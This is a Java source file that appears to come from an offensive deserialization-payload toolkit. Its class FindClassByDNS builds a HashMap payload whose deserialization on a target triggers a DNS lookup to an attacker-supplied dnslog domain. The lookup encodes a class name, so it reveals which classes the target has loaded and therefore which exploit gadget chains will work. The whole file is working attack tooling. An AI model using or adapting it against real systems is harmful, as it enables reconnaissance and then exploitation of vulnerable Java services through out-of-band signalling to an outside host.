package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.utils.ProbeUtil;
import java.util.HashMap;

public class FindClassByDNS implements ObjectPayload {

    @Override
    public Object getObject(String command) throws Exception {

        String[] parts = command.split("\\|");

        if (parts.length != 2) {
            throw new IllegalArgumentException("参数格式错误！请使用: dnslog_url|class_name");
        }

        String dnsUrl = parts[0].trim();
        String className = parts[1].trim();

        if (dnsUrl.startsWith("http://")) {
            dnsUrl = dnsUrl.substring(7);
        } else if (dnsUrl.startsWith("https://")) {
            dnsUrl = dnsUrl.substring(8);
        }

        if (dnsUrl.endsWith("/")) {
            dnsUrl = dnsUrl.substring(0, dnsUrl.length() - 1);
        }

        String safeClassName = className.replace(".", "_").replace("$", "_");
        String fullUrl = "http://" + safeClassName + "." + dnsUrl;

        HashMap<Object, Object> payload = ProbeUtil.makeDNSProbeMap(fullUrl, className);

        if (payload == null) {
            throw new Exception("Payload 生成失败：无法加载或生成类 " + className);
        }

        return payload;
    }
}